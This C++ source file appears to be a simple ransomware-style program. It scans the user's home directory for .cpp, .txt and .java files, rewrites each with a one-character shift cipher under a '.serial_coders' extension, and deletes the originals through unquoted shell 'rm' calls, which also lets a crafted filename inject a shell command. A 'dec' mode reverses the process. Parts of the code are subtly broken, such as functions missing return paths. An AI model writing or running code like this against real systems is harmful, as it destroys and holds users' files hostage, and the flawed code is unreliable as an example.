#include <bits/stdc++.h>
using namespace std;

int key=1;

fstream fin,fout,lin;
string file_name,ext;

void decrypt(string str,int key){
    int i;
    char a='a';
    for(i=0;i<str.size();i++)
    {
        a=str[i];
        a=(a+key)%128;
        fout<<a;      
    }
}

void encrypt(string str,int key){
    int i;
    char a='a';
    for(i=0;i<str.size();i++)
    {
        a=str[i];
        a=(a-key)%128;
        fout<<a;      
    }
}

string file_name_extractor(string str)
{
    int i;
    for(i=0;i<str.size();i++)
    {
        if(str[i]=='.')
        {
            return str.substr(0,i);
        }
    }   
}

string extention_extractor(string str)
{
    int i;
    for(i=0;i<str.size();i++)
    {
        if(str[i]=='.')
        {
            return str.substr(i+1,str.size()-i-1);
        }
    }   
}

void encrypter(string input)
{
    string str;
    
    file_name+=".serial_coders";
    fout.open(file_name.c_str(),ios::out );
    
    str=extention_extractor(input);
    encrypt(ext,1);
    fout<<endl;
    
    while(true)
	{
	    getline(fin,str);
	    encrypt(str,key);
	    if(fin.eof()){
	        break;
	    }
	    fout<<endl;
	}
	fout.close();
}

void decrypter(string input)
{
    string str;
    
    //add orig extention to file_name
	getline(fin,str);
	cout<<str<<endl;
	char a;
	file_name+=".";
	for(int i=0;i<str.size();i++)
    {
        a=str[i];
        a=(a+key)%128;
        file_name+=a;     
    }
    fout.open(file_name.c_str(),ios::out );
    
    while(true)
	{
	    getline(fin,str);
	    decrypt(str,key);
	    if(fin.eof()){
	        break;
	    }
	    fout<<endl;
	}
	fout.close();
}

void list_gen(){

     string command = " \
        dir_pres=$PWD if [ -f $dir_pres/files ] ; then rm $dir_pres/files fi cd $HOME \
        file0=""*.cpp */*.cpp */*/*.cpp */*/*/*.cpp */*/*/*/*.cpp "" \
        file1=""*.txt */*.txt */*/*.txt */*/*/*.txt */*/*/*/*.txt"" \
        file2=""*.java */*.java */*/*.java */*/*/*.java */*/*/*/*.java"" \
        for i in $file0 $file1 $file2; do [ -f ""$i"" ] && echo ""$HOME$i"" >>$dir_pres/files ; done | sort \
        if [ -f $dir_pres/encrypted_list ] ; then \
            rm $dir_pres/encrypted_list \
            fi \
        file3=""*.serial_coders */*.serial_coders */*/*.serial_coders */*/*/*.serial_coders */*/*/*/*.serial_coders"" \
        for i in $file3; do [ -f ""$i"" ] && echo ""$HOME$i"" >>$dir_pres/encrypted_list ; done | sort \
        ";

   // system(command.c_str());
    system("./list_gen.sh");
    cout<<"list generated\n";
}

void enc_dec(string input){
    cout<<"enc_dec\n";
    string str;
	
	if(input==""){
	    return;
	}
	
	fin.open(input.c_str(),ios::in);
	ext=extention_extractor(input);
	file_name=file_name_extractor(input);
	
	if(ext=="serial_coders")//to be decrypted
	{
	    cout<<"decrypting "<<input<<".. \n";
	    decrypter(input);
	}
	else//to be encrypted
	{
	    cout<<"encrypting "<<input<<".. \n";
	    encrypter(input);
	}
	
    str=(string)"rm "+input+" ";
    system(str.c_str());
    
	fin.close();
	fout.close();
}

void list_reader(string task){
    if(task=="enc")
	{
	    cout<<"task == enc\n";
	    lin.open("files",ios::in);
	    if(!lin){
	        exit(0);
	    }
	}
	else
	{
	    cout<<"task == dec\n";
	    lin.open("encrypted_list",ios::in);
	    if(!lin){
	        exit(0);
	    }
	}
	
	string str,command;
    while(true)
	{
	    if(lin.eof()){
	        break;
	    }
	    getline(lin,str);
	    enc_dec(str);
	        
	}
	cout<<"back in list_reader\n";
	lin.close();
}

int main(int argc, char *argv[])
{
	string input,str;
	
	list_gen();
	
	input=argv[1];
	if(input=="enc")
	{
	    cout<<"list_reader(enc) called\n";
	    list_reader("enc");
	}
	else if(input=="dec")
	{
	    cout<<"list_reader(dec) called\n";
	    list_reader("dec");
	}
	else{
	    return 0;
	}

	fin.close();
	cout<<"success\n";
	return 0;
}
